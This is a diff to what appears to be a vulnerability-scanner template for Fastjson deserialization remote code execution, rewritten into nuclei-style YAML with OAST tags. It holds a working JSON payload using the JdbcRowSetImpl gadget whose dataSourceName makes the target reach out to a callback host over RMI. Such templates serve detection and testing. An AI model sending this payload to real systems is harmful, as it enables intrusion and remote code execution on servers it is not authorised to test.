@@ -7,22 +7,29 @@ info:
   reference:
     - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
     - https://github.com/wyzxxz/fastjson_rce_tool
+  tags: fastjson,rce,deserialization,oast
 
-set:
-  reverse: newReverse()
-  reverseURL: reverse.url.host
-rules:
-  r0:
-    request:
-      method: POST
-      path: /
-      headers:
-        Content-Type: application/json; charset=utf-8
-      body: |
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
         {
            "@type":"Lcom.sun.rowset.JdbcRowSetImpl",
-           "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+           "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
            "autoCommit":true
         }
-    expression: response.status == 200 && reverse.wait(5)
-expression: r0() 
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol   # Confirms DNS Interaction
+        words:
+          - "dns"
+
+      - type: status
+        negative: true
+        status:
+          - 200
